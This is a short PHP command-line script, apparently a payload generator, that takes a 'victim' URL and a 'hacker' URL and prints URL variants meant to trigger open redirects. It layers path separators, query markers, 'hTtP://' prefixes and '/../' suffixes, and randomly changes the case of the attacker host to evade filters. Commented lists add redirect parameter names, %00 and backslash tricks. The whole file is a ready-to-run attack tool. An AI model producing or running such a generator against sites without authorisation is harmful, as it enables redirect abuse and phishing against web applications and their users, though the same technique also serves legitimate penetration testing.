<?php

function usage( $err=null ) {
  echo 'Usage: '.$_SERVER['argv'][0]." <victim url> <hacker url>\n";
  if( $err ) {
    echo 'Error: '.$err."!\n";
  }
  exit();
}


if( $_SERVER['argc'] != 3 ) {
  usage();
}

$victim = strtolower( trim($_SERVER['argv'][1]) );
$hacker = strtolower( trim($_SERVER['argv'][2]) );
foreach( str_split($hacker) as $k=>$h ) {
	if( rand(0,1) ) $hacker[$k]=strtoupper($h);
}


//$payload = victim_url + $separator + $post_separator + $parameter + $equal + $pre_prefix + $prefix + $hacker_url + $suffix;

//$init_t_separator = ['','/','//','///','\\','\\\\','\\\\\\'];
$init_t_separator = ['/'];
//$init_t_post_separator = ['','?','#','?#','%5c'];
$init_t_post_separator = ['','?'];
//$init_t_parameter = ['','d','dest','dst','origin','out','q','redirect','r','redir','return','returnURI','return_uri','returnURL','return_url','return_to','returnTo','u','uri','url'];
$init_t_parameter = [''];
//$init_t_pre_prefix = ['',' ','%00'];
$init_t_pre_prefix = [''];
//$init_t_prefix = ['','hTtP:/','hTtP://','hTtP:///','/','//','///','\\','\\\\','\\\\\\'];
$init_t_prefix = ['','hTtP://'];
$init_t_suffix = ['','/','/../'];
//$init_t_suffix = [''];

file_put_contents( 'php://stderr', sprintf("Victim: %s\n", $victim) );
file_put_contents( 'php://stderr', sprintf("Hacker: %s\n\n", $hacker) );
file_put_contents( 'php://stderr', sprintf("Separators: %d\n", count($init_t_separator)) );
file_put_contents( 'php://stderr', sprintf("Post separators: %d\n", count($init_t_post_separator)) );
file_put_contents( 'php://stderr', sprintf("Pre prefixes: %d\n", count($init_t_pre_prefix)) );
file_put_contents( 'php://stderr', sprintf("Prefixes: %d\n", count($init_t_prefix)) );
file_put_contents( 'php://stderr', sprintf("Parameters: %d\n", count($init_t_parameter)) );
file_put_contents( 'php://stderr', sprintf("Suffixes: %d\n\n", count($init_t_suffix)) );

$n = 0;
$t_separator = $init_t_separator;
$t_post_separator = $init_t_post_separator;
$t_pre_prefix = $init_t_pre_prefix;
$t_prefix = $init_t_prefix;
$t_parameter = $init_t_parameter;
$t_suffix = $init_t_suffix;


foreach( $t_separator as $separator )
{
	foreach( $t_post_separator as $post_separator )
	{
		if( $post_separator == '' ) {
			$t_parameter = [''];
		}

		foreach( $t_pre_prefix as $pre_prefix )
		{
			foreach( $t_prefix as $prefix )
			{
				foreach( $t_parameter as $parameter )
				{
					foreach( $t_suffix as $suffix )
					{
						$n++;
						$equal = ($parameter == '') ? '' : '=';
						$payload = $separator . $post_separator . $parameter . $equal . $pre_prefix . $prefix . $hacker . $suffix;
						$url = $victim . $payload;
						echo $url."\n";
						/*if( $pre_prefix != '%00' ) {
							if( ($pencode=urlencode($payload)) != $payload ) {
								$n++;
								$url = $victim . $pencode;
								echo $url."\n";
							}
						}*/
					}
				}
			}
		}

		$t_parameter = $init_t_parameter;
	}
}

file_put_contents( 'php://stderr', sprintf("\n%d payloads generated\n",$n) );
